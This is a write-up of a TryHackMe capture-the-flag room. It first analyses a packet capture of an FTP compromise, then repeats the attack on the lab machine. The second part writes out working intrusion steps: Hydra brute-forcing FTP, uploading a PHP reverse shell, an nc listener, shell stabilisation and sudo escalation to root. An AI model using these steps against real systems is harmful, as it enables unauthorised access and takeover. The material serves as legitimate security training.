


<img width="997" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/6afe444c-e330-4bfa-9f85-4d0502e70e5a">

This is a write-up for the H4cked room on tryhackme, this consists of analyzing a .pcap file to find-out the details of a hack against a server.
we will be using wireshark for the Analysis 
`wireshark Capture.pcapng `
<img width="992" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/fe427632-d354-46e0-8825-8723e3a8ce2a">
<br>
<br>
<br>
<br>

## Task 1  -- Oh no! We've been hacked!
- The attacker is trying to log into a specific service. What service is this?

<img width="993" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/de022bdf-112d-4110-a7a3-a5cbd121bcd6">
Answer --> `FTP` <br> 
The first request in the pcap file is a login request to port 21(FTP). Following the tcp-stream, we saw that the attacker tried to login-to the user 'Jenny' but failed <br> 
<br>
note : to follow tcp stream, right click on the traffic then select tcp-stream under the follow option
<br>
<img width="991" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/02d1f4e2-58ea-4ca8-af42-13574885071b">
<br>
<br>
<br>
- There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?


Let's check the traffics for any brute-force attempts<br>

<img width="995" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/b821da11-5866-4ff6-a6df-35a4fa8b707c">



here we found a brute-force attempt against The ftp service. now lets make a quick google search for tools used to brute-force ftp

<img width="990" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/f4e4e4e9-2214-4e14-8353-2b4ebef49cc4">

We found a tool called hydra <br>

Answer --> `HYDRA`<br>
<br>
<br>
<br>

- The attacker is trying to log on with a specific username. What is the username?

Analyzing the failed login traffic, we found a specific username the attacker was trying to log on.
<img width="995" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/120f4b07-b7f2-437e-a7a9-4f1b727345e4">

ANSWER --> JENNY


- What is the user's password?
To get the user's password, we need to check the successful login tcp stream, this can be done by searching for ftp Successful login.
`ftp.response.code == 230 `
<img width="990" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/e684868f-9e39-45f6-b4bf-1d24dbdaf77a">

now let's follow the  tcp stream for the first traffic to see the login credentials 

<img width="1002" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/b96de9ea-5310-4945-9108-d2db05442d14">

 ANSWER --> password123 

- What is the current FTP working directory after the attacker logged in?

We can get the full detail of the FTP connection session by following the connection stream. Now lets try following the tcp stream.
`ftp.response.code == 230`
Then select the second traffic 
<img width="989" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/e7b0cdd0-6e56-4ae9-bc49-a1164f9626c3">

now follow the tcp stream of the traffic 
<img width="995" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/9e5c1969-c51e-4ce1-944c-8de1e6839edf">

the current Directory is specified on line 9

ANSWER --> /var/www/html


- The attacker uploaded a backdoor. What is the backdoor's filename?
in the tcp-stream we can see the attacker uploaded a file name store.php
<img width="995" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/6f7936a4-2ee3-46a9-9b33-5228a5ff31b6">

ANSWER -->  shell.php 

 - The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

Given in the hint section, using the `ftp-data` filter and then following the stream, we can view the content of the uploaded shell 
<img width="995" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/e4413cd6-da9e-4397-8a5c-5e688cb96559">

answer --> http://pentestmonkey.net/tools/php-reverse-shell






-  Which command did the attacker manually execute after getting a reverse shell?
since we have the attacker's payload, lets check the port specified in it 
<img width="997" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/31e33856-3aa6-443a-a2b1-e290ccab739a">

port 80 , now lets search for all the requests to the specifies ip address and the port
`ip.dest == 192.168.0.147 && tcp.port == 80`
now follow the tcp-stream of the PSH and ACK
<img width="997" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/751030a6-6bd1-4b73-9054-df9a5b6f84ed">

Following the tcp-stream we see all the activities of the attacker including all the command being executed 
<img width="995" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/6ac78ca4-a14a-4a5a-9721-32c64fe4ffa2">

ANSWER --> whoami


 - What is the computer's hostname? 
Answer --> wir3



- Which command did the attacker execute to spawn a new TTY shell?
<img width="992" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/bc257882-a96c-4ae8-8bed-bb8083d55068">

--> python3 -c 'import pty; pty.spawn("/bin/bash")'


- Which command was executed to gain a root shell?
Here to get the root shell, the attacker logged into jenny's account using the ftp credentials. then the attacker checked for all jenny's sudo privileges where the attacker discovered that jenny had the privilege to access the root account without a password.

<img width="994" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/1c94e8dc-5024-4249-b22d-61dfe5272e7d">
 
 ANSWER --> `sudo su`

- The attacker downloaded something from GitHub. What is the name of the GitHub project?

<img width="995" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/b658e077-e1be-4b33-9acf-7636c94948fe">

Answer -- REPTILE 


-  The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

from the Github repo about section, it specifies that the backdoor is a rootkit
<img width="998" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/dc30ff16-91db-452f-ae7f-cd3d63308572">




## TASK 2 -- Hack your way back into the machine

The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!


Lets start by scanning the target using nmap 

`nmap 10.10.125.249`
<img width="996" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/7215d996-7a04-4725-a2c2-ef734bb526c6">

Now lets brute-force the FTP service using the /usr/share/wordlists/rockyou.txt wordlist.
```bash
┌──(wraith㉿kali)-[~/thm/h4cked]
└─$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.125.249
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-02 13:34:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.125.249:21/
[21][ftp] host: 10.10.125.249   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-02 13:35:12

```

USER : jenny 
PASS: 987654321

FTP SERVER ACCESS 
<img width="896" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/cb3b6062-9c11-4923-b17f-1b0aebf23dd3">

Now lets upload our reverse shell payload.
there is a pre-built pentest-monkey revshell payload in kali-linux located in `/usr/share/webshells/php/php-reverse-shell.php`. 
lets copy the payload to our current directory and then fill in our credentials (ip-address, port)
<img width="993" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/2a94cb1a-a900-408a-9a94-756f8f21e2c1">

now lets save this file and upload it to the ftp server.


```
ftp> put shell.php 
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||45246|)
150 Ok to send data.
100% |******************************************|  5493       17.87 MiB/s    00:00 ETA
ftp> chmod +x shell.php
200 SITE CHMOD command ok.
ftp> 

```

Now that we've uploaded our payload and assigned it the proper permissions, lets run it and get a reverse shell. 
creating Listener :
`nc -nlvp 2020`
triggering payload
http://ip/shell.php 

BOOM!! We have our shell 
<img width="994" alt="image" src="https://github.com/wraith969/wraith969.github.io/assets/70425343/002d227e-c091-4c73-beae-a19cf75cdb78">

lets stabilize our shell and log on to Jenny's account .
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm
```

Jenny's Account 
```
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ 
```


PRIVILEGE ESCALATION

```
jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ 

```

Since jenny's account has the privilege to run all commands on the system, lets log on directly to the root user.
```
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# whoami
whoami
root
root@wir3:/# 

```

From here we can get our flag and submit it 




THANK YOU 🙏
